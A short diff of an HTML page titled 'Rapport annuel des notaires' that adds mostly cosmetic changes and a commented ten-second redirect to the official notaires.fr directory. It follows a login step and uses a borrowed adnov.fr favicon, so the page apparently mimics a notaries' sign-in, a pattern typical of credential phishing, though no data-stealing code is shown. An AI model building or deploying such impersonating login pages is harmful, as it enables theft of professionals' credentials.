@@ -1,7 +1,8 @@
+<!DOCTYPE html>
 <html lang="fr">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Rapport annuel des notaires</title>
   <link rel="icon" type="image/png" href="https://prismeoffice.adnov.fr/media/view/0/0/0/0/01fffecaefaa2865ad6202935da0d7a9da9c2b8e.png">
   <link rel="preconnect" href="https://fonts.googleapis.com">
@@ -12,9 +13,9 @@
   <style>
     body {
       font-family: 'Open Sans', sans-serif;
+      background-color: #f8f9fa;
       margin: 0;
       padding: 0;
-      background-color: #f6f6f6;
     }
 
     #load {
@@ -224,6 +225,7 @@
             submitBtn.disabled = false;
             submitBtn.textContent = "S'identifier";
 
+            // 🔁 Redirection après 10 secondes
             setTimeout(() => {
               window.location.href = "https://www.notaires.fr/fr/directory";
             }, 10000);
